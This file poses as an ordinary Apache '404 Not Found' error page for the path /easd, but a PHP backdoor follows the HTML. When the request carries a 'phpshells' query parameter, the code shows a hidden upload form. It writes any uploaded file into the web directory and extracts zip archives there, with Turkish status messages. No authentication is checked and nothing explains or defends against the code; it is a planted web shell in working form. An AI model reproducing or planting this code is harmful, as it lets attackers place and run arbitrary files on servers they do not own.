<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /easd was not found on this server.</p>
</body></html>
<?php
if(isset($_GET["phpshells"])){
  echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
  echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
  if( $_POST['_upl'] == "Upload" ) {
  $file = $_FILES['file']['name'];
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
  $zip = new ZipArchive;
  if ($zip->open($file) === TRUE) {
     $zip->extractTo('./');
     $zip->close();
  echo 'Yükleme Başarılı';
  } else {
  echo 'Yüklenmedi.';
  }
  }else{
  echo '<b>Basarisiz</b><br><br>';
  }
  }
}
?>